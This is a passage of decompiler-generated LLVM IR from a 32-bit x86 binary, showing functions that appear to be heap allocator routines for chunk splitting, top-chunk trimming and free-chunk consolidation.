  %v0_80525fc = load i32, i32* @ebx, align 4
  store i32 %v0_80525fc, i32* @global_var_8063f24.358, align 4
  br label %dec_label_pc_8052605

dec_label_pc_8052605:                             ; preds = %dec_label_pc_80525b7, %dec_label_pc_805259c, %dec_label_pc_8052597, %dec_label_pc_80524c6, %dec_label_pc_80525de
  %v0_8052605 = load i32, i32* @global_var_8063f48.354, align 8
  store i32 %v0_8052605, i32* %eax.global-to-local, align 4
  %v1_805260a = load i32, i32* @global_var_8063f4c.359, align 4
  %tmp132 = icmp ugt i32 %v0_8052605, %v1_805260a
  br i1 %tmp132, label %dec_label_pc_8052612, label %dec_label_pc_8052617

dec_label_pc_8052612:                             ; preds = %dec_label_pc_8052605
  store i32 %v0_8052605, i32* @global_var_8063f4c.359, align 4
  br label %dec_label_pc_8052617

dec_label_pc_8052617:                             ; preds = %dec_label_pc_8052605, %dec_label_pc_8052612
  %v1_8052617 = load i32, i32* @global_var_8063f44.352, align 4
  %v2_8052617 = add i32 %v1_8052617, %v0_8052605
  store i32 %v2_8052617, i32* %eax.global-to-local, align 4
  %v1_805261d = load i32, i32* @global_var_8063f54.355, align 4
  %tmp133 = icmp ugt i32 %v2_8052617, %v1_805261d
  br i1 %tmp133, label %dec_label_pc_8052625, label %dec_label_pc_805262a

dec_label_pc_8052625:                             ; preds = %dec_label_pc_8052617
  store i32 %v2_8052617, i32* @global_var_8063f54.355, align 4
  br label %dec_label_pc_805262a

dec_label_pc_805262a:                             ; preds = %dec_label_pc_8052617, %dec_label_pc_8052625
  %v0_805262a = load i32, i32* @global_var_8063c0c.342, align 4
  store i32 %v0_805262a, i32* @ebx, align 4
  %v1_8052630 = add i32 %v0_805262a, 4
  %v2_8052630 = inttoptr i32 %v1_8052630 to i32*
  %v3_8052630 = load i32, i32* %v2_8052630, align 4
  %v1_8052633 = and i32 %v3_8052630, -4
  store i32 %v1_8052633, i32* @ecx, align 4
  %v10_8052636 = icmp ult i32 %v1_8052633, %v1_80522d3
  br i1 %v10_8052636, label %dec_label_pc_80526b6, label %dec_label_pc_805263c

dec_label_pc_805263c:                             ; preds = %dec_label_pc_805262a
  store i32 %v1_805235e, i32* %esi.global-to-local, align 4
  %v2_8052642 = sub i32 %v1_8052633, %v1_805235e
  store i32 %v2_8052642, i32* %ecx.global-to-local, align 4
  %v2_8052644 = add i32 %v0_805262a, %v1_805235e
  store i32 %v2_8052644, i32* @edx, align 4
  %v1_8052647 = or i32 %v1_805235e, 1
  store i32 %v1_8052647, i32* %eax.global-to-local, align 4
  store i32 %v2_8052644, i32* @global_var_8063c0c.342, align 4
  store i32 %v1_8052647, i32* %v2_8052630, align 4
  %v0_8052653.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052653

dec_label_pc_8052653:                             ; preds = %dec_label_pc_80522e4, %dec_label_pc_805263c
  %v0_8052653 = phi i32 [ %v5_80522f7, %dec_label_pc_80522e4 ], [ %v0_8052653.pre, %dec_label_pc_805263c ]
  %v1_8052653 = or i32 %v0_8052653, 1
  store i32 %v1_8052653, i32* @ecx, align 4
  %v0_8052656 = load i32, i32* @ebx, align 4
  %v1_8052656 = add i32 %v0_8052656, 8
  store i32 %v1_8052656, i32* %ebx.global-to-local, align 4
  %v1_8052659 = load i32, i32* @edx, align 4
  %v2_8052659 = add i32 %v1_8052659, 4
  %v3_8052659 = inttoptr i32 %v2_8052659 to i32*
  store i32 %v1_8052653, i32* %v3_8052659, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_805265e:                             ; preds = %dec_label_pc_805209e
  %v5_8052664 = sub i32 %v1_8052081, %v1_805235e
  store i32 %v5_8052664, i32* %eax.global-to-local, align 4
  %v2_8052668 = add i32 %v0_805214c109, %v1_805235e
  store i32 %v2_8052668, i32* @edx, align 4
  %v1_805266c = or i32 %v1_805235e, 1
  store i32 %v2_8052668, i32* @global_var_8063c10.343, align 16
  store i32 %v1_805266c, i32* %v2_805207b, align 4
  %v0_8052678 = load i32, i32* %eax.global-to-local, align 4
  %v0_805267a = load i32, i32* @edx, align 4
  store i32 %v0_805267a, i32* @global_var_8063c1c.360, align 4
  %v1_8052680 = or i32 %v0_8052678, 1
  store i32 %v1_8052680, i32* @ecx, align 4
  store i32 %v0_805267a, i32* @global_var_8063c20.345, align 32
  %v1_8052689 = add i32 %v0_805267a, 8
  %v2_8052689 = inttoptr i32 %v1_8052689 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_8052689, align 4
  %v0_8052690 = load i32, i32* @edx, align 4
  %v1_8052690 = add i32 %v0_8052690, 12
  %v2_8052690 = inttoptr i32 %v1_8052690 to i32*
  store i32 ptrtoint (i32* @global_var_8063c14.344 to i32), i32* %v2_8052690, align 4
  %v0_8052697 = load i32, i32* @ecx, align 4
  %v1_8052697 = load i32, i32* @edx, align 4
  %v2_8052697 = add i32 %v1_8052697, 4
  %v3_8052697 = inttoptr i32 %v2_8052697 to i32*
  store i32 %v0_8052697, i32* %v3_8052697, align 4
  %v0_805269a = load i32, i32* %eax.global-to-local, align 4
  %v1_805269a = load i32, i32* @edx, align 4
  %v3_805269a = add i32 %v1_805269a, %v0_805269a
  %v4_805269a = inttoptr i32 %v3_805269a to i32*
  store i32 %v0_805269a, i32* %v4_805269a, align 4
  br label %dec_label_pc_80526a8

dec_label_pc_805269f:                             ; preds = %dec_label_pc_80520ad
  store i32 %v1_805235e, i32* %ebx.global-to-local, align 4
  %v0_80526a3 = load i32, i32* @ebp, align 4
  %v2_80526a3 = or i32 %v1_805235e, 4
  %v3_80526a3 = add i32 %v0_80526a3, %v2_80526a3
  %v4_80526a3 = inttoptr i32 %v3_80526a3 to i32*
  %v5_80526a3 = load i32, i32* %v4_80526a3, align 4
  %v6_80526a3 = or i32 %v5_80526a3, 1
  store i32 %v6_80526a3, i32* %v4_80526a3, align 4
  br label %dec_label_pc_80526a8

dec_label_pc_80526a8:                             ; preds = %dec_label_pc_805265e, %dec_label_pc_805269f
  %v0_80526a8 = load i32, i32* @ebp, align 4
  %v1_80526a8 = add i32 %v0_80526a8, 8
  store i32 %v1_80526a8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_80526ad:                             ; preds = %dec_label_pc_805219d
  %v1_80526ad = load i32, i32* @ebx, align 4
  %v2_80526ad = add i32 %v0_80521ac, 4
  %v3_80526ad = add i32 %v2_80526ad, %v1_80526ad
  %v4_80526ad = inttoptr i32 %v3_80526ad to i32*
  %v5_80526ad = load i32, i32* %v4_80526ad, align 4
  %v6_80526ad = or i32 %v5_80526ad, 1
  store i32 %v6_80526ad, i32* %v4_80526ad, align 4
  br label %dec_label_pc_80526b2

dec_label_pc_80526b2:                             ; preds = %dec_label_pc_80521b5, %dec_label_pc_80526ad
  %v0_80526b2 = load i32, i32* @ecx, align 4
  store i32 %v0_80526b2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_80526b6:                             ; preds = %dec_label_pc_8052474, %dec_label_pc_805262a, %dec_label_pc_805247e
  %v0_80526b6 = load i32, i32* %stack_var_-92, align 4
  %v1_80526b6 = call i32 @function_8050568(i32 %v0_80526b6)
  store i32 %v1_80526b6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80526bd = inttoptr i32 %v1_80526b6 to i32*
  store i32 12, i32* %v1_80526bd, align 4
  br label %dec_label_pc_80526c3

dec_label_pc_80526c3:                             ; preds = %dec_label_pc_80526b2, %dec_label_pc_80526a8, %dec_label_pc_8052653, %dec_label_pc_805230f, %dec_label_pc_80522c1, %dec_label_pc_8052048, %dec_label_pc_80526b6
  store i32 %v2_8051f7f, i32* @eax, align 4
  store i32 %v2_8051f7f, i32* %stack_var_-92, align 4
  %v2_80526cc = call i32 @function_80535d2(i32 %v2_8051f7f, i32 1)
  store i32 %v2_80526cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80526d4

dec_label_pc_80526d4:                             ; preds = %dec_label_pc_8051f9d, %dec_label_pc_80526c3
  %v0_80526d7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80526d7, i32* %eax.global-to-local, align 4
  %v2_80526d9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80526d9, i32* @ebx, align 4
  store i32 %v0_8051f6c, i32* @esi, align 4
  store i32 %v0_8051f6b, i32* @edi, align 4
  store i32 %v0_8051f6a, i32* @ebp, align 4
  ret i32 %v0_80526d7

; uselistorder directives
  uselistorder i32 %v0_805269a, { 1, 0 }
  uselistorder i32 %v0_805267a, { 1, 0, 2 }
  uselistorder i32 %v2_8052617, { 1, 0, 2 }
  uselistorder i32 %v0_8052605, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805259c, { 1, 0 }
  uselistorder i32 %v2_805258a, { 1, 0 }
  uselistorder i32 %v1_8052541, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v2_805252b, { 1, 0, 2 }
  uselistorder i32 %v2_805251f, { 1, 2, 0 }
  uselistorder i32 %v2_805251a, { 1, 0, 2 }
  uselistorder i32 %v1_805250a, { 2, 1, 0 }
  uselistorder i8 %v0_80524d8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_80524bb, { 1, 0, 2 }
  uselistorder i32 %v0_805256f90, { 2, 0, 1 }
  uselistorder i32 %v0_805257d91, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_80524b5, { 2, 1, 0 }
  uselistorder i32 %v8_805248b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8052488, { 1, 0 }
  uselistorder i32 %v0_8052467, { 1, 0 }
  uselistorder i32 %v2_8052438, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052430, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805241d, { 1, 0 }
  uselistorder i32 %v1_8052414, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_8052401, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_80523e5, { 1, 0, 2 }
  uselistorder i32 %v2_80523d1, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_805239a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805238e, { 2, 1, 0 }
  uselistorder i32 %v8_805237d, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052364, { 1, 0, 2 }
  uselistorder i32 %v0_8052300, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_80522d3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80522c9, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_80522bb, { 1, 0 }
  uselistorder i32 %v1_8052252, { 1, 0 }
  uselistorder i32 %v3_8052246, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052256, { 1, 0 }
  uselistorder i32 %v2_8052240, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805223d12, { 1, 0 }
  uselistorder i32 %v2_8052232, { 1, 0 }
  uselistorder i32 %v1_8052216, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052212, { 2, 1, 0 }
  uselistorder i32 %v1_805220e, { 1, 0 }
  uselistorder i32 %v1_8052202, { 2, 1, 0 }
  uselistorder i32 %v2_80521f8, { 1, 0 }
  uselistorder i32 %v1_80521f5, { 1, 2, 0 }
  uselistorder i32 %v4_8052193, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_80521de, { 1, 0 }
  uselistorder i32 %v0_80521ac, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805217f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805214c, { 1, 2, 0 }
  uselistorder i32 %v2_8052130, { 1, 0 }
  uselistorder i32 %v1_8052126, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052121.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052111, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052108, { 1, 0, 2 }
  uselistorder i32 %v2_80520e4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80520cc, { 2, 1, 0 }
  uselistorder i32 %v0_80520b8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_805207e, { 1, 0, 2 }
  uselistorder i32 %v0_805214c109, { 0, 3, 1, 2 }
  uselistorder i32 %v3_805202b, { 1, 0, 2 }
  uselistorder i32 %v2_805201d, { 2, 1, 0 }
  uselistorder i32 %v2_8051ff8, { 2, 1, 0 }
  uselistorder i8 %v0_8051fc6, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805235e, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8051faf, { 0, 2, 1 }
  uselistorder i32 %v0_8051f98, { 1, 0 }
  uselistorder i32 %v2_8051f7f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 17, 0, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8063f40.357, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8053900, { 1, 0 }
  uselistorder i32 134626324, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8063c20.345, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8051f44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8063c0c.342 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_80526d4, { 1, 0 }
  uselistorder label %dec_label_pc_80526c3, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_80526b6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80526b2, { 1, 0 }
  uselistorder label %dec_label_pc_80526a8, { 1, 0 }
  uselistorder label %dec_label_pc_8052653, { 1, 0 }
  uselistorder label %dec_label_pc_805262a, { 1, 0 }
  uselistorder label %dec_label_pc_8052617, { 1, 0 }
  uselistorder label %dec_label_pc_8052605, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052597, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052592, { 1, 0 }
  uselistorder label %dec_label_pc_8052576, { 1, 0 }
  uselistorder label %dec_label_pc_805251f, { 1, 0 }
  uselistorder label %dec_label_pc_8052508, { 1, 0 }
  uselistorder label %dec_label_pc_80524f1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052474, { 1, 0 }
  uselistorder label %dec_label_pc_8052467, { 1, 0 }
  uselistorder label %dec_label_pc_8052428, { 1, 0 }
  uselistorder label %dec_label_pc_8052401, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80523e5, { 1, 0 }
  uselistorder label %dec_label_pc_80523cc, { 1, 0 }
  uselistorder label %dec_label_pc_80523ae, { 1, 0 }
  uselistorder label %dec_label_pc_80522c9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80522c1, { 1, 0 }
  uselistorder label %dec_label_pc_80522aa, { 1, 0 }
  uselistorder label %dec_label_pc_805223d, { 1, 0 }
  uselistorder label %dec_label_pc_8052242.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052216, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805219d, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_8052124, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805210d, { 1, 0 }
  uselistorder label %dec_label_pc_805207b, { 1, 0 }
  uselistorder label %dec_label_pc_805214c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052048, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8051fc6, { 1, 0 }
}

define i32 @function_80526e0() local_unnamed_addr {
dec_label_pc_80526e0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80526e7 = load i32, i32* @edx, align 4
  store i32 %v0_80526e7, i32* %ebp.global-to-local, align 4
  %v1_80526e9 = add i32 %v0_80526e7, 860
  %v2_80526e9 = inttoptr i32 %v1_80526e9 to i32*
  %v3_80526e9 = load i32, i32* %v2_80526e9, align 4
  store i32 %v3_80526e9, i32* @ecx, align 4
  %v1_80526ef = add i32 %v0_80526e7, 44
  %v2_80526ef = inttoptr i32 %v1_80526ef to i32*
  %v3_80526ef = load i32, i32* %v2_80526ef, align 4
  %v1_80526f2 = add i32 %v3_80526ef, 4
  %v2_80526f2 = inttoptr i32 %v1_80526f2 to i32*
  %v3_80526f2 = load i32, i32* %v2_80526f2, align 4
  %v1_80526f5 = and i32 %v3_80526f2, -4
  store i32 %v1_80526f5, i32* @esi, align 4
  %v1_80526fa = load i32, i32* @eax, align 4
  %v2_80526fa = add i32 %v3_80526e9, -17
  %v2_80526fc = add i32 %v2_80526fa, %v1_80526f5
  %v3_80526fc = sub i32 %v2_80526fc, %v1_80526fa
  %div = udiv i32 %v3_80526fc, %v3_80526e9
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80526fc, %v3_80526e9
  store i32 %tmp10, i32* @edx, align 4
  %v1_8052704 = add i32 %div, -1
  %v4_8052707 = mul i32 %v1_8052704, %v3_80526e9
  store i32 %v4_8052707, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052707, 1
  br i1 %tmp11, label %dec_label_pc_8052763, label %dec_label_pc_805270e

dec_label_pc_805270e:                             ; preds = %dec_label_pc_80526e0
  %v1_8052713 = call i32 @function_8053aec(i32 0)
  store i32 %v1_8052713, i32* %edi.global-to-local, align 4
  %v0_805271a = load i32, i32* @esi, align 4
  store i32 %v0_805271a, i32* %eax.global-to-local, align 4
  %v1_805271c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805271c = add i32 %v1_805271c, 44
  %v3_805271c = inttoptr i32 %v2_805271c to i32*
  %v4_805271c = load i32, i32* %v3_805271c, align 4
  %v5_805271c = add i32 %v4_805271c, %v0_805271a
  store i32 %v5_805271c, i32* %eax.global-to-local, align 4
  %v12_8052722 = icmp eq i32 %v1_8052713, %v5_805271c
  %v1_8052724 = icmp eq i1 %v12_8052722, false
  br i1 %v1_8052724, label %dec_label_pc_8052763, label %dec_label_pc_8052726

dec_label_pc_8052726:                             ; preds = %dec_label_pc_805270e
  %v1_8052729 = sub i32 0, %v4_8052707
  store i32 %v1_8052729, i32* @ebx, align 4
  %v1_805272c = call i32 @function_8053aec(i32 %v1_8052729)
  store i32 %v1_805272c, i32* %eax.global-to-local, align 4
  %v1_8052738 = call i32 @function_8053aec(i32 0)
  store i32 %v1_8052738, i32* %eax.global-to-local, align 4
  %v10_8052740 = icmp eq i32 %v1_8052738, -1
  br i1 %v10_8052740, label %dec_label_pc_8052763, label %dec_label_pc_8052745

dec_label_pc_8052745:                             ; preds = %dec_label_pc_8052726
  %v0_8052745 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052747 = sub i32 %v0_8052745, %v1_8052738
  %v12_8052747 = icmp eq i32 %v2_8052747, 0
  store i32 %v2_8052747, i32* @ecx, align 4
  br i1 %v12_8052747, label %dec_label_pc_8052763, label %dec_label_pc_805274b

dec_label_pc_805274b:                             ; preds = %dec_label_pc_8052745
  %v0_805274b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805274b = add i32 %v0_805274b, 44
  %v2_805274b = inttoptr i32 %v1_805274b to i32*
  %v3_805274b = load i32, i32* %v2_805274b, align 4
  store i32 %v3_805274b, i32* %eax.global-to-local, align 4
  %v1_805274e = add i32 %v0_805274b, 872
  %v2_805274e = inttoptr i32 %v1_805274e to i32*
  %v3_805274e = load i32, i32* %v2_805274e, align 4
  %v5_805274e = sub i32 %v3_805274e, %v2_8052747
  store i32 %v5_805274e, i32* %v2_805274e, align 4
  %v0_8052754 = load i32, i32* @esi, align 4
  %v1_8052754 = load i32, i32* @ecx, align 4
  %v2_8052754 = sub i32 %v0_8052754, %v1_8052754
  %v1_8052756 = or i32 %v2_8052754, 1
  %v1_8052759 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052759 = add i32 %v1_8052759, 4
  %v3_8052759 = inttoptr i32 %v2_8052759 to i32*
  store i32 %v1_8052756, i32* %v3_8052759, align 4
  br label %dec_label_pc_8052765

dec_label_pc_8052763:                             ; preds = %dec_label_pc_8052745, %dec_label_pc_8052726, %dec_label_pc_805270e, %dec_label_pc_80526e0
  br label %dec_label_pc_8052765

dec_label_pc_8052765:                             ; preds = %dec_label_pc_805274b, %dec_label_pc_8052763
  %storemerge = phi i32 [ 1, %dec_label_pc_805274b ], [ 0, %dec_label_pc_8052763 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052738, { 1, 0, 2 }
  uselistorder i32 %v4_8052707, { 1, 2, 0 }
  uselistorder i32 %v3_80526e9, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @function_8053aec, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8052765, { 1, 0 }
}

define i32 @function_805276d(i32* %arg1) local_unnamed_addr {
dec_label_pc_805276d:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_805276e = load i32, i32* @edi, align 4
  %v0_805276f = load i32, i32* @esi, align 4
  %v0_8052770 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8052778 = load i32, i32* %arg1, align 4
  store i32 %v2_8052778, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_805277f = icmp eq i32 %v2_8052778, 0
  br i1 %v1_805277f, label %dec_label_pc_80528a8.preheader, label %dec_label_pc_8052787

dec_label_pc_80528a8.preheader:                   ; preds = %dec_label_pc_805276d
  %v3_805289d = add i32 %tmp11, 44
  br label %dec_label_pc_8052899

dec_label_pc_8052787:                             ; preds = %dec_label_pc_805276d
  %v1_805278b = and i32 %v2_8052778, -3
  store i32 %v1_805278b, i32* %arg1, align 4
  %v1_8052790 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805279b = add i32 %tmp11, 4
  store i32 %v1_805279b, i32* %eax.global-to-local, align 4
  %v2_80527a6 = load i32, i32* %arg1, align 4
  %v2_80527ac = udiv i32 %v2_80527a6, 8
  %v2_80527af = mul nuw i32 %v2_80527ac, 4
  %v3_80527af = add i32 %tmp11, -4
  %v4_80527af = add i32 %v3_80527af, %v2_80527af
  store i32 %v4_80527af, i32* %eax.global-to-local, align 4
  %v2_8052876 = add i32 %tmp11, 44
  %v3_8052876 = inttoptr i32 %v2_8052876 to i32*
  %v1_8052849 = add i32 %tmp11, 60
  %v2_8052849 = inttoptr i32 %v1_8052849 to i32*
  br label %dec_label_pc_80527b7

dec_label_pc_80527b7:                             ; preds = %dec_label_pc_805288f, %dec_label_pc_8052787
  %v0_80527c5 = phi i32 [ %v1_805279b, %dec_label_pc_8052787 ], [ %v4_805288f, %dec_label_pc_805288f ]
  store i32 %v0_80527c5, i32* %eax.global-to-local, align 4
  %v1_80527bb = inttoptr i32 %v0_80527c5 to i32*
  %v2_80527bb = load i32, i32* %v1_80527bb, align 4
  store i32 %v2_80527bb, i32* @ecx, align 4
  %v1_80527bd = icmp eq i32 %v2_80527bb, 0
  br i1 %v1_80527bd, label %dec_label_pc_8052885, label %dec_label_pc_80527c5

dec_label_pc_80527c5:                             ; preds = %dec_label_pc_80527b7
  store i32 0, i32* %v1_80527bb, align 4
  %v0_80527cb.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80527cb

dec_label_pc_80527cb:                             ; preds = %dec_label_pc_8052879, %dec_label_pc_80527c5
  %v0_80527e8 = phi i32 [ %v3_80527cb, %dec_label_pc_8052879 ], [ %v0_80527cb.pre, %dec_label_pc_80527c5 ]
  %v1_80527cb = add i32 %v0_80527e8, 8
  %v2_80527cb = inttoptr i32 %v1_80527cb to i32*
  %v3_80527cb = load i32, i32* %v2_80527cb, align 4
  store i32 %v3_80527cb, i32* %edx.global-to-local, align 4
  %v1_80527d2 = add i32 %v0_80527e8, 4
  %v2_80527d2 = inttoptr i32 %v1_80527d2 to i32*
  %v3_80527d2 = load i32, i32* %v2_80527d2, align 4
  store i32 %v3_80527d2, i32* %eax.global-to-local, align 4
  %v1_80527d7 = and i32 %v3_80527d2, -2
  store i32 %v1_80527d7, i32* @edi, align 4
  %v2_80527da = urem i32 %v3_80527d2, 2
  %v3_80527da = icmp eq i32 %v2_80527da, 0
  %v2_80527dc = add i32 %v1_80527d7, %v0_80527e8
  store i32 %v2_80527dc, i32* @ebx, align 4
  %v1_80527df = add i32 %v2_80527dc, 4
  %v2_80527df = inttoptr i32 %v1_80527df to i32*
  %v3_80527df = load i32, i32* %v2_80527df, align 4
  store i32 %v3_80527df, i32* %edx.global-to-local, align 4
  %v1_80527e6 = icmp eq i1 %v3_80527da, false
  br i1 %v1_80527e6, label %dec_label_pc_8052808, label %dec_label_pc_80527e8

dec_label_pc_80527e8:                             ; preds = %dec_label_pc_80527cb
  %v1_80527e8 = inttoptr i32 %v0_80527e8 to i32*
  %v2_80527e8 = load i32, i32* %v1_80527e8, align 4
  store i32 %v2_80527e8, i32* %ebp.global-to-local, align 4
  %v2_80527ec = sub i32 %v0_80527e8, %v2_80527e8
  store i32 %v2_80527ec, i32* %eax.global-to-local, align 4
  %v1_80527ee = add i32 %v2_80527ec, 8
  %v2_80527ee = inttoptr i32 %v1_80527ee to i32*
  %v3_80527ee = load i32, i32* %v2_80527ee, align 4
  store i32 %v3_80527ee, i32* @esi, align 4
  %v1_80527f1 = add i32 %v2_80527ec, 12
  %v2_80527f1 = inttoptr i32 %v1_80527f1 to i32*
  %v3_80527f1 = load i32, i32* %v2_80527f1, align 4
  store i32 %v3_80527f1, i32* %edx.global-to-local, align 4
  %v1_80527f4 = add i32 %v3_80527ee, 12
  %v2_80527f4 = inttoptr i32 %v1_80527f4 to i32*
  %v3_80527f4 = load i32, i32* %v2_80527f4, align 4
  store i32 %v3_80527f4, i32* @ecx, align 4
  %v12_80527f7 = icmp eq i32 %v3_80527f4, %v2_80527ec
  %v1_80527f9 = icmp eq i1 %v12_80527f7, false
  br i1 %v1_80527f9, label %dec_label_pc_8052838, label %dec_label_pc_80527fb

dec_label_pc_80527fb:                             ; preds = %dec_label_pc_80527e8
  %v1_80527fb = add i32 %v3_80527f1, 8
  %v2_80527fb = inttoptr i32 %v1_80527fb to i32*
  %v3_80527fb = load i32, i32* %v2_80527fb, align 4
  %v15_80527fb = icmp eq i32 %v3_80527fb, %v3_80527f4
  %v1_80527fe = icmp eq i1 %v15_80527fb, false
  br i1 %v1_80527fe, label %dec_label_pc_8052838, label %dec_label_pc_8052800

dec_label_pc_8052800:                             ; preds = %dec_label_pc_80527fb
  %v2_8052800 = add i32 %v2_80527e8, %v1_80527d7
  store i32 %v2_8052800, i32* @edi, align 4
  store i32 %v3_80527f1, i32* %v2_80527f4, align 4
  %v0_8052805 = load i32, i32* @esi, align 4
  %v1_8052805 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052805 = add i32 %v1_8052805, 8
  %v3_8052805 = inttoptr i32 %v2_8052805 to i32*
  store i32 %v0_8052805, i32* %v3_8052805, align 4
  %v0_8052813.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052808

dec_label_pc_8052808:                             ; preds = %dec_label_pc_80527cb, %dec_label_pc_8052800
  %v1_805281c = phi i32 [ %v2_80527dc, %dec_label_pc_80527cb ], [ %v0_8052813.pre, %dec_label_pc_8052800 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8052810 = and i32 %v3_80527df, -4
  store i32 %v1_8052810, i32* %ebp.global-to-local, align 4
  %v4_8052813 = load i32, i32* %v3_8052876, align 4
  %v15_8052813 = icmp eq i32 %v1_805281c, %v4_8052813
  br i1 %v15_8052813, label %dec_label_pc_8052869, label %dec_label_pc_8052818

dec_label_pc_8052818:                             ; preds = %dec_label_pc_8052808
  %v2_8052818 = add i32 %v1_805281c, 4
  %v3_8052818 = add i32 %v2_8052818, %v1_8052810
  %v4_8052818 = inttoptr i32 %v3_8052818 to i32*
  %v5_8052818 = load i32, i32* %v4_8052818, align 4
  store i32 %v5_8052818, i32* %eax.global-to-local, align 4
